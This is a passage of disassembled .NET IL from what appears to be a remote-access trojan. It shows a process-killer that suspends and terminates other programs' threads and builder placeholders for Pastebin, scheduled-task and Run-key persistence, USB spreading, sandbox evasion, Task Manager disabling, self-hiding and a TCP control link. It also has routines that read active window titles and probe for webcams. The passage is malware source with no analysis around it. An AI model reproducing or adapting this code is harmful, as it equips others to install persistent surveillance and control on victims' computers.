      IL_0037:  br.s       IL_0051

      IL_0039:  ldloc.1
      IL_003a:  ldloc.2
      IL_003b:  ldelem.ref
      IL_003c:  stloc.3
      IL_003d:  ldloc.3
      IL_003e:  ldstr      ".exe"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_004d

      IL_004a:  ldloc.3
      IL_004b:  starg.s    Path
      IL_004d:  ldloc.2
      IL_004e:  ldc.i4.1
      IL_004f:  add.ovf
      IL_0050:  stloc.2
      IL_0051:  ldloc.2
      IL_0052:  ldloc.1
      IL_0053:  ldlen
      IL_0054:  conv.i4
      IL_0055:  blt.s      IL_0039

      IL_0057:  ldarg.0
      IL_0058:  ldstr      ".exe"
      IL_005d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0062:  brfalse.s  IL_0076

      IL_0064:  ldarg.0
      IL_0065:  ldstr      ".exe"
      IL_006a:  ldsfld     string [mscorlib]System.String::Empty
      IL_006f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0074:  starg.s    Path
      IL_0076:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_007b:  stloc.0
      IL_007c:  ldloc.0
      IL_007d:  ldlen
      IL_007e:  conv.i4
      IL_007f:  ldc.i4.1
      IL_0080:  sub.ovf
      IL_0081:  stloc.s    V_4
      IL_0083:  ldc.i4.0
      IL_0084:  stloc.s    V_5
      IL_0086:  br.s       IL_00af

      IL_0088:  ldloc.0
      IL_0089:  ldloc.s    V_5
      IL_008b:  ldelem.ref
      IL_008c:  stloc.s    V_6
      IL_008e:  ldloc.s    V_6
      IL_0090:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0095:  ldarg.0
      IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_009b:  brfalse.s  IL_00a9

      IL_009d:  ldloc.s    V_6
      IL_009f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_00a4:  call       void BotKillers::TerminateProcess(int32)
      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4.1
      IL_00ac:  add.ovf
      IL_00ad:  stloc.s    V_5
      IL_00af:  ldloc.s    V_5
      IL_00b1:  ldloc.s    V_4
      IL_00b3:  ble.s      IL_0088

      IL_00b5:  leave.s    IL_00c3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c1:  leave.s    IL_00c3

    }  // end handler
    IL_00c3:  ret
  } // end of method BotKillers::TerminateProcessPath

  .method public static void  TerminateProcess(int32 PID) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [mscorlib]System.Collections.IEnumerator V_1,
             class [System]System.Diagnostics.ProcessThread V_2,
             native int V_3)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  stloc.0
      IL_0007:  ldloc.0
      IL_0008:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000d:  ldsfld     string [mscorlib]System.String::Empty
      IL_0012:  ldc.i4.0
      IL_0013:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0018:  brfalse.s  IL_0084

      .try
      {
        IL_001a:  ldloc.0
        IL_001b:  callvirt   instance class [System]System.Diagnostics.ProcessThreadCollection [System]System.Diagnostics.Process::get_Threads()
        IL_0020:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.ReadOnlyCollectionBase::GetEnumerator()
        IL_0025:  stloc.1
        IL_0026:  br.s       IL_0066

        IL_0028:  ldloc.1
        IL_0029:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
        IL_002e:  castclass  [System]System.Diagnostics.ProcessThread
        IL_0033:  stloc.2
        IL_0034:  ldc.i4.3
        IL_0035:  ldc.i4.1
        IL_0036:  ldloc.2
        IL_0037:  callvirt   instance int32 [System]System.Diagnostics.ProcessThread::get_Id()
        IL_003c:  conv.ovf.u4
        IL_003d:  call       native int BotKillers::OpenThread(valuetype BotKillers/ThreadAccess,
                                                               bool,
                                                               uint32)
        IL_0042:  stloc.3
        IL_0043:  ldloc.3
        IL_0044:  ldsfld     native int [mscorlib]System.IntPtr::Zero
        IL_0049:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                         native int)
        IL_004e:  brfalse.s  IL_0066

        IL_0050:  ldloc.3
        IL_0051:  call       int32 BotKillers::SuspendThread(native int)
        IL_0056:  pop
        IL_0057:  ldloc.3
        IL_0058:  ldc.i4.1
        IL_0059:  call       bool BotKillers::TerminateThread(native int,
                                                              uint32)
        IL_005e:  pop
        IL_005f:  ldloc.3
        IL_0060:  call       bool BotKillers::CloseHandle(native int)
        IL_0065:  pop
        IL_0066:  ldloc.1
        IL_0067:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
        IL_006c:  brtrue.s   IL_0028

        IL_006e:  leave.s    IL_0084

      }  // end .try
      finally
      {
        IL_0070:  ldloc.1
        IL_0071:  isinst     [mscorlib]System.IDisposable
        IL_0076:  brfalse.s  IL_0083

        IL_0078:  ldloc.1
        IL_0079:  isinst     [mscorlib]System.IDisposable
        IL_007e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0083:  endfinally
      }  // end handler
      IL_0084:  leave.s    IL_0092

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0090:  leave.s    IL_0092

    }  // end handler
    IL_0092:  ret
  } // end of method BotKillers::TerminateProcess

  .method private static pinvokeimpl("kernel32.dll" lasterr winapi) 
          bool  CloseHandle(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          native int  OpenThread(valuetype BotKillers/ThreadAccess dwDesiredAccess,
                                 bool bInheritHandle,
                                 uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" lasterr winapi) 
          int32  SuspendThread(native int hThread) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          bool  TerminateThread(native int hThread,
                                uint32 dwExitCode) cil managed preservesig
  {
  }
} // end of class BotKillers

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public TernaryRasterOperations
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCCOPY = int32(0x00CC0020)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCPAINT = int32(0x00EE0086)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCAND = int32(0x008800C6)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCINVERT = int32(0x00660046)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCERASE = int32(0x00440328)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCCOPY = int32(0x00330008)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCERASE = int32(0x001100A6)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGECOPY = int32(0x00C000CA)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGEPAINT = int32(0x00BB0226)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATCOPY = int32(0x00F00021)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATPAINT = int32(0x00FB0A09)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATINVERT = int32(0x005A0049)
    .field public static literal valuetype j.OK/TernaryRasterOperations DSTINVERT = int32(0x00550009)
    .field public static literal valuetype j.OK/TernaryRasterOperations BLACKNESS = int32(0x00000042)
    .field public static literal valuetype j.OK/TernaryRasterOperations WHITENESS = int32(0x00FF0062)
  } // end of class TernaryRasterOperations

  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .field private class [mscorlib]System.Threading.Thread MouseThread
  .field private static literal int32 SRCCOPY = int32(0x00CC0020)
  .field private class [mscorlib]System.Random r
  .field public static bool PasteE
  .field public static string PASTEBIN
  .field public static bool Sched
  .field public static string SCHEDNAME
  .field public static bool ANYRUN
  .field public static string Bypass
  .field public static bool TaskMGR
  .field public static bool Melty
  .field public static bool KProc
  .field public static string Proc
  .field public static string SLP
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string NTTA
  .field public static string VR
  .field public static string Y
  .field public static bool BOT_KILL
  .field public static bool HIDE_ME
  .field public static bool Persis
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       471 (0x1d7)
    .maxstack  1
    IL_0000:  ldstr      "[PasteE]"
    IL_0005:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_000a:  stsfld     bool j.OK::PasteE
    IL_000f:  ldstr      "[PASTEBIN]"
    IL_0014:  stsfld     string j.OK::PASTEBIN
    IL_0019:  ldstr      "[Sched]"
    IL_001e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0023:  stsfld     bool j.OK::Sched
    IL_0028:  ldstr      "[SCHEDNAME]"
    IL_002d:  stsfld     string j.OK::SCHEDNAME
    IL_0032:  ldstr      "[ANYRUN]"
    IL_0037:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_003c:  stsfld     bool j.OK::ANYRUN
    IL_0041:  ldstr      "[Bypass]"
    IL_0046:  stsfld     string j.OK::Bypass
    IL_004b:  ldstr      "[TaskMGR]"
    IL_0050:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0055:  stsfld     bool j.OK::TaskMGR
    IL_005a:  ldstr      "[Melty]"
    IL_005f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0064:  stsfld     bool j.OK::Melty
    IL_0069:  ldstr      "[KProc]"
    IL_006e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0073:  stsfld     bool j.OK::KProc
    IL_0078:  ldstr      "[Proc]"
    IL_007d:  stsfld     string j.OK::Proc
    IL_0082:  ldstr      "[SLP]"
    IL_0087:  stsfld     string j.OK::SLP
    IL_008c:  ldc.i4     0x1401
    IL_0091:  newarr     [mscorlib]System.Byte
    IL_0096:  stsfld     uint8[] j.OK::b
    IL_009b:  ldstr      "[BD]"
    IL_00a0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00a5:  stsfld     bool j.OK::BD
    IL_00aa:  ldnull
    IL_00ab:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00b0:  ldc.i4.0
    IL_00b1:  stsfld     bool j.OK::Cn
    IL_00b6:  ldstr      "[DR]"
    IL_00bb:  stsfld     string j.OK::DR
    IL_00c0:  ldstr      "[EXE]"
    IL_00c5:  stsfld     string j.OK::EXE
    IL_00ca:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00cf:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_00d4:  ldstr      "[H]"
    IL_00d9:  stsfld     string j.OK::H
    IL_00de:  ldstr      "[Idr]"
    IL_00e3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00e8:  stsfld     bool j.OK::Idr
    IL_00ed:  ldstr      "[Anti_CH]"
    IL_00f2:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00f7:  stsfld     bool j.OK::Anti_CH
    IL_00fc:  ldstr      "[Isf]"
    IL_0101:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0106:  stsfld     bool j.OK::IsF
    IL_010b:  ldstr      "[USB_SP]"
    IL_0110:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0115:  stsfld     bool j.OK::USB_SP
    IL_011a:  ldstr      "[Isu]"
    IL_011f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0124:  stsfld     bool j.OK::Isu
    IL_0129:  ldnull
    IL_012a:  stsfld     class j.kl j.OK::kq
    IL_012f:  ldstr      ""
    IL_0134:  stsfld     string j.OK::lastcap
    IL_0139:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_013e:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0143:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0148:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_014d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0152:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_0157:  ldnull
    IL_0158:  stsfld     object j.OK::MT
    IL_015d:  ldstr      "[P]"
    IL_0162:  stsfld     string j.OK::P
    IL_0167:  ldnull
    IL_0168:  stsfld     object j.OK::PLG
    IL_016d:  ldstr      "[EXE]"
    IL_0172:  stsfld     string j.OK::RG
    IL_0177:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_017c:  stsfld     string j.OK::sf
    IL_0181:  ldstr      "[VN]"
    IL_0186:  stsfld     string j.OK::VN
    IL_018b:  ldstr      "WhyYouReverseMe..ImInnocent..LoveYouu.."
    IL_0190:  stsfld     string j.OK::NTTA
    IL_0195:  ldstr      "Platinum"
    IL_019a:  stsfld     string j.OK::VR
    IL_019f:  ldstr      "[Y]"
    IL_01a4:  stsfld     string j.OK::Y
    IL_01a9:  ldstr      "[BOTKILL]"
    IL_01ae:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01b3:  stsfld     bool j.OK::BOT_KILL
    IL_01b8:  ldstr      "[HIDE_ME]"
    IL_01bd:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01c2:  stsfld     bool j.OK::HIDE_ME
    IL_01c7:  ldstr      "[Persis]"
    IL_01cc:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_01d1:  stsfld     bool j.OK::Persis
    IL_01d6:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldnull
    IL_0008:  ldftn      void j.OK::Mouse()
    IL_000e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0013:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0018:  stfld      class [mscorlib]System.Threading.Thread j.OK::MouseThread
    IL_001d:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method public static string  RN(int32 c) cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (class [mscorlib]System.Random V_0,
             string V_1,
             string V_2,
             int32 V_3,
             int32 V_4)
    IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
    IL_0005:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_000a:  stloc.0
    IL_000b:  ldstr      ""
    IL_0010:  stloc.1
    IL_0011:  ldstr      "abcdefghijklmnopqrstuvwxyz"
    IL_0016:  stloc.2
    IL_0017:  ldarg.0
    IL_0018:  stloc.3
    IL_0019:  ldc.i4.1
    IL_001a:  stloc.s    V_4
    IL_001c:  br.s       IL_0043

    IL_001e:  ldloc.1
    IL_001f:  ldloc.2
    IL_0020:  ldloc.0
    IL_0021:  ldc.i4.0
    IL_0022:  ldloc.2
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_002d:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0032:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003c:  stloc.1
    IL_003d:  ldloc.s    V_4
    IL_003f:  ldc.i4.1
    IL_0040:  add.ovf
    IL_0041:  stloc.s    V_4
    IL_0043:  ldloc.s    V_4
    IL_0045:  ldloc.3
    IL_0046:  ble.s      IL_001e

    IL_0048:  ldloc.1
    IL_0049:  ret
  } // end of method OK::RN

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage(int32 hWnd,
                            uint32 msg,
                            uint32 wParam,
                            int32 lparam) cil managed preservesig
  {
  }
  .method private static void  Mouse() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             valuetype [System.Drawing]System.Drawing.Point V_7)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Mouse()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0017:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001c:  stloc.3
    IL_001d:  ldloca.s   V_3
    IL_001f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0024:  stloc.1
    IL_0025:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_002a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_002f:  stloc.3
    IL_0030:  ldloca.s   V_3
    IL_0032:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.1
    IL_0039:  stloc.s    V_4
    IL_003b:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0040:  dup
    IL_0041:  ldc.i4.0
    IL_0042:  ldloc.2
    IL_0043:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0048:  stloc.s    V_5
    IL_004a:  ldc.i4.0
    IL_004b:  ldloc.1
    IL_004c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0051:  stloc.s    V_6
    IL_0053:  ldloca.s   V_7
    IL_0055:  ldloc.s    V_5
    IL_0057:  call       instance void [System.Drawing]System.Drawing.Point::set_X(int32)
    IL_005c:  ldloca.s   V_7
    IL_005e:  ldloc.s    V_6
    IL_0060:  call       instance void [System.Drawing]System.Drawing.Point::set_Y(int32)
    IL_0065:  ldloc.s    V_7
    IL_0067:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
    IL_006c:  ldc.i4.s   50
    IL_006e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0073:  ldloc.s    V_4
    IL_0075:  ldc.i4.1
    IL_0076:  add.ovf
    IL_0077:  stloc.s    V_4
    IL_0079:  ldloc.s    V_4
    IL_007b:  ldc.i4.s   100
    IL_007d:  ble.s      IL_003b

    IL_007f:  ldloc.0
    IL_0080:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_0085:  ret
  } // end of method OK::Mouse

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
